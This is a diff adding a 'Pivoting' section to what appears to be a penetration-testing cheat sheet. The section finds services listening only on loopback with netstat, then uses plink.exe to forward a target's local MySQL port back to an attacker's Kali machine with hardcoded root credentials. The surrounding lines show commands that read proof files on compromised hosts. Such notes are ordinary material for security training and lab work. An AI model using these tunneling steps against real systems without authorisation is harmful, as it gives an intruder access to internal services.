@@ -16,6 +16,34 @@ hostname && whoami && type C:\Documents and Settings\Administrator\Desktop\proof
 hostname && whoami && cat /root/proof.txt && /sbin/ifconfig
 ```
 
+## Pivoting
+
+### Windows
+
+Find running service which are listening to loopback only (i.e., 127.0.0.1 or LISTENING/LISTEN in thier status):
+
+```
+netstat -ano
+```
+
+For example, if MySQL found listen locally on 3306 we can use plink.exe to prefrom port forward to our machine:
+
+```
+root@kali:~/#: plink.exe -l root -pw toor 192.168.0.101 -R 3306:127.0.0.1:3306
+```
+
+Then in kali you could interact with database locally:
+
+```
+root@kali:~/#: mysql -u root -p 
+```
+
+The plink.exe could be found here: https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
+
+### Linux
+
+TBD
+
 ## Transferring files
 
 ### Rdesktop
